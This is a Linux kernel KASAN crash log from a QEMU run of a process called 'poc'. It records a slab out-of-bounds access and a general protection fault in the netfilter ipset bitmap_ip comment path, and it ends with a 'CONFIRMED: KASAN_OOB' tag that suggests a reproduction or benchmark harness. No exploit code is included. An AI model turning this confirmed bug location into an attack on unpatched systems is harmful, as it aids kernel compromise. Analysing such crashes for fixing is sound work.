[    1.123128]  netlink_sendmsg+0x75c/0xc00
[    1.123285]  ? __pfx_netlink_sendmsg+0x10/0x10
[    1.123462]  ? __import_iovec+0x36c/0x600
[    1.123622]  ? _raw_spin_lock_irqsave+0x86/0xe0
[    1.123803]  ____sys_sendmsg+0x822/0xa00
[    1.123960]  ? __pfx_____sys_sendmsg+0x10/0x10
[    1.124138]  ? __pfx_copy_msghdr_from_user+0x10/0x10
[    1.124334]  ? up_read+0x1a/0xb0
[    1.124466]  ___sys_sendmsg+0x100/0x180
[    1.124619]  ? __pfx____sys_sendmsg+0x10/0x10
[    1.124794]  ? mutex_unlock+0x7e/0xd0
[    1.124943]  ? __pfx_vfs_write+0x10/0x10
[    1.125100]  __sys_sendmsg+0xe6/0x190
[    1.125247]  ? __pfx___sys_sendmsg+0x10/0x10
[    1.125418]  ? fpregs_restore_userregs+0xe3/0x1f0
[    1.125606]  do_syscall_64+0xa6/0x1a0
[    1.125757]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.125957] RIP: 0033:0x43be00
[    1.126082] Code: ff f7 d8 48 c7 c3 ff ff ff ff 64 89 02 eb bd 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 61 c2 06 00 00 74 17 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 58 c3 0f 1f 80 00 00 00 00 48 83 ec 28 89 54
[    1.126796] RSP: 002b:00007ffe0974e008 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[    1.127091] RAX: ffffffffffffffda RBX: 0000000000000024 RCX: 000000000043be00
[    1.127368] RDX: 0000000000000000 RSI: 00007ffe0974e020 RDI: 0000000000000003
[    1.127646] RBP: 0000000000000003 R08: 00000000000000ff R09: 0000000000000006
[    1.127925] R10: 00000000ffffffff R11: 0000000000000202 R12: 00000000004a92e0
[    1.128202] R13: 0000000000000001 R14: 0000000000000001 R15: 0000000000000001
[    1.128479]  </TASK>
[    1.128571] 
[    1.128637] Allocated by task 65:
[    1.128773]  kasan_save_stack+0x33/0x60
[    1.128927]  kasan_save_track+0x14/0x30
[    1.129080]  __kasan_kmalloc+0x8f/0xa0
[    1.129230]  __kmalloc_node_noprof+0x18f/0x370
[    1.129407]  __kvmalloc_node_noprof+0x4e/0x150
[    1.129585]  bitmap_ip_create+0x4a5/0xaa0
[    1.129748]  ip_set_create+0x5d4/0xeb0
[    1.129898]  nfnetlink_rcv_msg+0x654/0x8b0
[    1.130060]  netlink_rcv_skb+0x12f/0x370
[    1.130217]  nfnetlink_rcv+0x14b/0x360
[    1.130367]  netlink_unicast+0x5c2/0x830
[    1.130523]  netlink_sendmsg+0x75c/0xc00
[    1.130679]  ____sys_sendmsg+0x822/0xa00
[    1.130837]  ___sys_sendmsg+0x100/0x180
[    1.130990]  __sys_sendmsg+0xe6/0x190
[    1.131136]  do_syscall_64+0xa6/0x1a0
[    1.131283]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.131482] 
[    1.131548] The buggy address belongs to the object at ffff888009c9c000
[    1.131548]  which belongs to the cache kmalloc-8k of size 8192
[    1.132027] The buggy address is located 16 bytes to the right of
[    1.132027]  allocated 5080-byte region [ffff888009c9c000, ffff888009c9d3d8)
[    1.132529] 
[    1.132595] The buggy address belongs to the physical page:
[    1.132813] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x9c98
[    1.133116] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    1.133412] flags: 0x100000000000040(head|node=0|zone=1)
[    1.133621] page_type: f5(slab)
[    1.133752] raw: 0100000000000040 ffff888006842280 dead000000000122 0000000000000000
[    1.134051] raw: 0000000000000000 0000000080020002 00000001f5000000 0000000000000000
[    1.134350] head: 0100000000000040 ffff888006842280 dead000000000122 0000000000000000
[    1.134653] head: 0000000000000000 0000000080020002 00000001f5000000 0000000000000000
[    1.134957] head: 0100000000000003 ffffea0000272601 ffffffffffffffff 0000000000000000
[    1.135259] head: 0000000000000008 0000000000000000 00000000ffffffff 0000000000000000
[    1.135561] page dumped because: kasan: bad access detected
[    1.135779] 
[    1.135845] Memory state around the buggy address:
[    1.136034]  ffff888009c9d280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[    1.136314]  ffff888009c9d300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[    1.136595] >ffff888009c9d380: 00 00 00 00 00 00 00 00 00 00 00 fc fc fc fc fc
[    1.136877]                                                           ^
[    1.137133]  ffff888009c9d400: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.137414]  ffff888009c9d480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.137696] ==================================================================
[    1.137978] Disabling lock debugging due to kernel taint
[    1.138802] Oops: general protection fault, probably for non-canonical address 0xe7fffc001fff6dec: 0000 [#1] PREEMPT SMP KASAN NOPTI
[    1.139261] KASAN: maybe wild-memory-access in range [0x40000000fffb6f60-0x40000000fffb6f67]
[    1.139589] CPU: 1 UID: 0 PID: 65 Comm: poc Tainted: G    B              6.12.0-rc4-00229-g041bd1e4f2d8-dirty #1
[    1.139982] Tainted: [B]=BAD_PAGE
[    1.140116] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.140482] RIP: 0010:strlen+0x1e/0xa0
[    1.140633] Code: 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 b8 00 00 00 00 00 fc ff df 55 48 89 fa 48 89 fd 53 48 c1 ea 03 48 83 ec 08 <0f> b6 04 02 48 89 fa 83 e2 07 38 d0 7f 04 84 c0 75 50 80 7d 00 00
[    1.141346] RSP: 0018:ffffc90000426ed8 EFLAGS: 00010296
[    1.141552] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000
[    1.141831] RDX: 080000001fff6dec RSI: ffff888009cdb358 RDI: 40000000fffb6f62
[    1.142108] RBP: 40000000fffb6f62 R08: ffff888009cdb352 R09: ffff888009cdb358
[    1.142385] R10: ffffffffffffffff R11: 6e696c6261736944 R12: ffff888009cdb300
[    1.142663] R13: ffffc900004270b0 R14: ffffc90000427090 R15: 40000000fffb6f52
[    1.142944] FS:  000000000064d380(0000) GS:ffff88806d100000(0000) knlGS:0000000000000000
[    1.143257] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.143484] CR2: 00007ffe0974cec0 CR3: 000000000709c000 CR4: 0000000000750ef0
[    1.143764] PKRU: 55555554
[    1.143874] Call Trace:
[    1.143975]  <TASK>
[    1.144063]  ? die_addr+0x3b/0xa0
[    1.144199]  ? exc_general_protection+0x151/0x220
[    1.144386]  ? asm_exc_general_protection+0x26/0x30
[    1.144578]  ? strlen+0x1e/0xa0
[    1.144708]  ip_set_init_comment+0x16e/0x210
[    1.144881]  bitmap_ip_add+0x695/0xed0
[    1.145031]  ? __pfx_bitmap_ip_add+0x10/0x10
[    1.145202]  ? __pfx__raw_spin_trylock+0x10/0x10
[    1.145385]  ? __pfx_bitmap_ip_add+0x10/0x10
[    1.145556]  bitmap_ip_uadt+0x5d9/0x9f0
[    1.145711]  ? __pfx_bitmap_ip_uadt+0x10/0x10
[    1.145885]  ? _raw_spin_lock_bh+0x84/0xe0
[    1.146047]  ? __pfx__raw_spin_lock_bh+0x10/0x10
[    1.146231]  ? unwind_next_frame+0xc42/0x2440
[    1.146405]  call_ad.constprop.0+0x124/0x8c0
[    1.146576]  ? __pfx_call_ad.constprop.0+0x10/0x10
[    1.146767]  ? alloc_workqueue+0x6a2/0x19f0
[    1.146932]  ? unwind_get_return_address+0x59/0xa0
[    1.147123]  ? arch_stack_walk+0xa7/0x100
[    1.147282]  ? __pfx___nla_validate_parse+0x10/0x10
[    1.147475]  ip_set_ad.constprop.0.isra.0+0x36f/0x7c0
[    1.147674]  ? __pfx_stack_trace_save+0x10/0x10
[    1.147857]  ? __pfx_ip_set_ad.constprop.0.isra.0+0x10/0x10
[    1.148075]  ? alloc_migration_target_by_mpol+0x250/0x3e0
[    1.148287]  ? kasan_save_stack+0x33/0x60
[    1.148447]  ? mutex_lock+0x8c/0xe0
[    1.148588]  ? __pfx_mutex_lock+0x10/0x10
[    1.148749]  nfnetlink_rcv_msg+0x654/0x8b0
[    1.148913]  ? __pfx_nfnetlink_rcv_msg+0x10/0x10
[    1.149096]  ? unwind_get_return_address+0x59/0xa0
[    1.149286]  ? kasan_save_stack+0x33/0x60
[    1.149446]  ? kasan_save_track+0x14/0x30
[    1.149606]  ? __kasan_slab_alloc+0x6e/0x70
[    1.149774]  ? kmem_cache_alloc_node_noprof+0xe2/0x280
[    1.149976]  ? kmalloc_reserve+0x139/0x230
[    1.150139]  ? __alloc_skb+0x10f/0x2d0
[    1.150289]  ? netlink_sendmsg+0x584/0xc00
[    1.150451]  ? ____sys_sendmsg+0x822/0xa00
[    1.150614]  ? ___sys_sendmsg+0x100/0x180
[    1.150774]  ? __sys_sendmsg+0xe6/0x190
[    1.150927]  ? do_syscall_64+0xa6/0x1a0
[    1.151080]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.151286]  netlink_rcv_skb+0x12f/0x370
[    1.151442]  ? __pfx_nfnetlink_rcv_msg+0x10/0x10
[    1.151626]  ? __pfx_netlink_rcv_skb+0x10/0x10
[    1.151805]  nfnetlink_rcv+0x14b/0x360
[    1.151956]  ? __kasan_slab_alloc+0x6e/0x70
[    1.152122]  ? __pfx_nfnetlink_rcv+0x10/0x10
[    1.152293]  ? _copy_from_iter+0x177/0x10d0
[    1.152459]  netlink_unicast+0x5c2/0x830
[    1.152616]  ? __pfx_netlink_unicast+0x10/0x10
[    1.152794]  ? ktime_get_mono_fast_ns+0x84/0x320
[    1.152977]  ? tty_kref_put+0x1c/0x1a0
[    1.153128]  netlink_sendmsg+0x75c/0xc00
[    1.153284]  ? __pfx_netlink_sendmsg+0x10/0x10
[    1.153461]  ? __import_iovec+0x36c/0x600
[    1.153621]  ? _raw_spin_lock_irqsave+0x86/0xe0
[    1.153803]  ____sys_sendmsg+0x822/0xa00
[    1.153959]  ? __pfx_____sys_sendmsg+0x10/0x10
[    1.154136]  ? __pfx_copy_msghdr_from_user+0x10/0x10
[    1.154332]  ? up_read+0x1a/0xb0
[    1.154463]  ___sys_sendmsg+0x100/0x180
[    1.154616]  ? __pfx____sys_sendmsg+0x10/0x10
[    1.154791]  ? mutex_unlock+0x7e/0xd0
[    1.154939]  ? __pfx_vfs_write+0x10/0x10
[    1.155095]  __sys_sendmsg+0xe6/0x190
[    1.155242]  ? __pfx___sys_sendmsg+0x10/0x10
[    1.155413]  ? fpregs_restore_userregs+0xe3/0x1f0
[    1.155599]  do_syscall_64+0xa6/0x1a0
[    1.155747]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.155947] RIP: 0033:0x43be00
[    1.156071] Code: ff f7 d8 48 c7 c3 ff ff ff ff 64 89 02 eb bd 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 61 c2 06 00 00 74 17 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 58 c3 0f 1f 80 00 00 00 00 48 83 ec 28 89 54
[    1.156784] RSP: 002b:00007ffe0974e008 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[    1.157078] RAX: ffffffffffffffda RBX: 0000000000000024 RCX: 000000000043be00
[    1.157355] RDX: 0000000000000000 RSI: 00007ffe0974e020 RDI: 0000000000000003
[    1.157632] RBP: 0000000000000003 R08: 00000000000000ff R09: 0000000000000006
[    1.157911] R10: 00000000ffffffff R11: 0000000000000202 R12: 00000000004a92e0
[    1.158188] R13: 0000000000000001 R14: 0000000000000001 R15: 0000000000000001
[    1.158465]  </TASK>
[    1.158556] Modules linked in:
[    1.158684] ---[ end trace 0000000000000000 ]---
[    1.158869] RIP: 0010:strlen+0x1e/0xa0
[    1.159019] Code: 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 b8 00 00 00 00 00 fc ff df 55 48 89 fa 48 89 fd 53 48 c1 ea 03 48 83 ec 08 <0f> b6 04 02 48 89 fa 83 e2 07 38 d0 7f 04 84 c0 75 50 80 7d 00 00
[    1.159734] RSP: 0018:ffffc90000426ed8 EFLAGS: 00010296
[    1.159940] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000
[    1.160217] RDX: 080000001fff6dec RSI: ffff888009cdb358 RDI: 40000000fffb6f62
[    1.160497] RBP: 40000000fffb6f62 R08: ffff888009cdb352 R09: ffff888009cdb358
[    1.160778] R10: ffffffffffffffff R11: 6e696c6261736944 R12: ffff888009cdb300
[    1.161056] R13: ffffc900004270b0 R14: ffffc90000427090 R15: 40000000fffb6f52
[    1.161336] FS:  000000000064d380(0000) GS:ffff88806d100000(0000) knlGS:0000000000000000
[    1.161649] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.161877] CR2: 00007ffe0974cec0 CR3: 000000000709c000 CR4: 0000000000750ef0
[    1.162155] PKRU: 55555554
[    1.162266] Kernel panic - not syncing: Fatal exception in interrupt
[    1.162569] Kernel Offset: disabled
CONFIRMED: KASAN_OOB
